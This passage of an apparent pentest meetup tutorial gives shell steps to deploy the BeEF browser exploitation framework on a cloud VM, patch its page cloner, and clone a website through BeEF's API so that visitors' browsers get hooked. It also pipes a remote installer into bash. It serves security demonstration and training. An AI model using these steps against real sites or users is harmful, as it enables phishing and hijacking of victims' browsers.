  EXT_IP=23.236.54.36
  # Remove external IP from known_hosts
  ssh-keygen -f "$HOME/.ssh/known_hosts" -R $EXT_IP
  # Add IP to /etc/hosts if not part of DNS
  # echo "$NAT  $FQDN" >> /etc/hosts
  INT_IP=10.240.52.147
  ssh-add $SSH_PRIV_FILE

  # Log into GCE instance (no password needed)
  ssh $VMUSER@$EXT_IP

Now that you're on the VM:

.. code-block:: bash

  # *******************************
  # *******************************
  # GCE steps
  # *******************************
  # *******************************

  # Set up variables again ...
  # REMEMBER TO CHANGE THE IPs
  EXT_IP=23.236.54.36
  INT_IP=10.240.52.147
  VMUSER=hacker
  INSTANCE="pentest-meetup"
  DOMAIN="gce.bitbender.org"
  FQDN="$INSTANCE.$DOMAIN"

  # More variables
  BEEF_IPP="$FQDN"
  BEEF_USER="lethal"
  BEEF_PW="beef-test"
  HTTP=https
  SUDO="$(which sudo)"
  [[ "$USER" == "root" ]] && SUDO=
  $SUDO date

  # Install needed software and set up authbind to allow binding to low port numbers
  $SUDO apt-get update
  $SUDO apt-get install curl git -y
  $SUDO apt-get install authbind -y
  $SUDO touch /etc/authbind/byport/80
  $SUDO chgrp $VMUSER /etc/authbind/byport/80
  $SUDO chmod 770 /etc/authbind/byport/80
  $SUDO touch /etc/authbind/byport/443
  $SUDO chgrp $VMUSER /etc/authbind/byport/443
  $SUDO chmod 770 /etc/authbind/byport/443
  $SUDO apt-get install gnupg2 -y
  gpg2 --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
  curl -sSL https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer \
      | bash -s stable
  source ~/.rvm/scripts/rvm
  rvm install 2.1.5
  rvm use 2.1.5 -- default
  gem install bundler
  git clone git://github.com/beefproject/beef.git
  cd beef
  # patch web_cloner.rb
  cat > patch.diff <<EOF
  diff --git a/extensions/social_engineering/web_cloner/web_cloner.rb b/extensions/social_engineering/web_cloner/web_cloner.rb
  index 5ef7083..d0f9203 100644
  --- a/extensions/social_engineering/web_cloner/web_cloner.rb
  +++ b/extensions/social_engineering/web_cloner/web_cloner.rb
  @@ -15,7 +15,9 @@ module BeEF
             @config = BeEF::Core::Configuration.instance
             @cloned_pages_dir = "#{File.expand_path('../../../../extensions/social_engineering/web_cloner', __FILE__)}/cloned_pages/"
             beef_proto = @config.get("beef.http.https.enable") == true ? "https" : "http"
  -          @beef_hook = "#{beef_proto}://#{@config.get('beef.http.host')}:#{@config.get('beef.http.port')}#{@config.get('beef.http.hook_file')}"
  +          beef_host = @config.get("beef.http.public") != nil ? @config.get("beef.http.public") : @config.get('beef.http.host')
  +          beef_port = @config.get("beef.http.public_port") != nil ? @config.get("beef.http.public_port") : @config.get('beef.http.port')
  +          @beef_hook = "#{beef_proto}://#{beef_host}:#{beef_port}#{@config.get('beef.http.hook_file')}"
           end
   
           def clone_page(url, mount, use_existing, dns_spoof)
  EOF
  git apply patch.diff
  # edit config.yaml
  [[ ! -e config.yaml.orig ]] && mv config.yaml config.yaml.orig
  cp config.yaml.orig config.yaml
  if [[ "$EXT_IP" != "$INT_IP" ]]; then
    sed -i -e 's/#public: ""/public: "'$FQDN'"/'  config.yaml
    sed -i -e 's/#public_port: ""/public_port: "'443'"/'  config.yaml
  fi
  sed -i -e 's/host: "0.0.0.0"/host: "'$INT_IP'"/'  config.yaml
  sed -i -e 's/port: "3000"/port: "'443'"/'  config.yaml
  sed -i -e 's/user:   "beef"/user:   "'"$BEEF_USER"'"/'  config.yaml
  sed -i -e 's/passwd: "beef"/passwd: "'"$BEEF_PW"'"/'  config.yaml
  sed -i -e '/https:/{n;s/false/true/}' config.yaml
  # install beef
  bundle install

  # Now run beef
  #   see only port 22 listening
  ss -tnl
  nohup authbind ruby beef &
  #   do this a couple of times to see how fast it starts
  ss -tnl
  # when done, stop BeEF via
  #   kill -INT $(ps -C ruby -o pid=)
  # look at log
  #   less $HOME/beef/nohup.out

Now the BeEF instance is up and running. Continue the demo on your exploit machine.

Clone_page
----------

Here is the command-line level for cloning a web page. After this is done you should be able to visit https://$FQDN/html/index.html and get hooked:

.. code-block:: bash

  # *******************************
  # *******************************
  # Exploiter host steps
  #   Clone a web site
  # *******************************
  # *******************************

  # Set up variables again ...
  BEEF_IPP="$FQDN"
  BEEF_USER="lethal"
  BEEF_PW="beef-test"
  HTTP=https
  CLONEME="https://pentest-meetup.appspot.com/html/index.html"

  # Get RESTapi TOKEN
  DATA='{"username":"'"$BEEF_USER"'", "password":"'"$BEEF_PW"'"}'
  RESPONSE=$(curl --silent --insecure --request POST \
                 --header "Content-Type: application/json" \
                 --data "$DATA" \
              $HTTP://$BEEF_IPP/api/admin/login)
  SUCCESS=${RESPONSE#*\"success\":}
  SUCCESS=${SUCCESS%%,*}
  echo SUCCESS=$SUCCESS
  TOKEN=${RESPONSE#*\"token\":\"}
  TOKEN=${TOKEN%%\"*}
  echo TOKEN=$TOKEN

  # clone_page using the TOKEN
  curl --insecure --header "Content-Type: application/json; charset=UTF-8"  \
       --data '{"url":"'$CLONEME'", "mount":"/html/index.html"}' \
       --request POST $HTTP://$BEEF_IPP/api/seng/clone_page?token=$TOKEN

  # Now can fetch cloned page and get hooked:
  # curl --insecure $HTTP://$FQDN/html/index.html | grep hook

Server delete
-------------

If you're done now first logon/logoff the GCE instance to shut down BeEF and the server:

.. code-block:: bash

  # On the attacker machine
  PROJECT="bitbender.org:bitbender"
  ZONE="us-central1-c"
  INSTANCE="pentest-meetup"
  DOMAIN="gce.bitbender.org"
  FQDN="$INSTANCE.$DOMAIN"
  VMUSER=hacker
  EMAIL="hacker@$DOMAIN"
  SSH_PRIV_FILE="$HOME/.ssh/id_rsa_gce"
  ssh-add $SSH_PRIV_FILE
  ssh $VMUSER@$EXT_IP

  # on the GCE BeEF instance
  cd
  cd beef
  kill -INT $(ps -C ruby -o pid=)
  SUDO="$(which sudo)"
  [[ "$USER" == "root" ]] && SUDO=
  $SUDO date
  $SUDO shutdown -h now

  # On the attacker machine
  #   it takes a little while for the instance to reach TERMINATED status
  gcloud compute instances list
  # If you're done with the instance:
  gcloud compute instances delete $INSTANCE --quiet
  gcloud compute instances list
  # And remove the added firewall-rules
  gcloud compute firewall-rules delete beef-local --quiet
  gcloud compute firewall-rules delete beef-external --quiet

Don't forget to clean up DNS or your :file:`/etc/hosts` file.
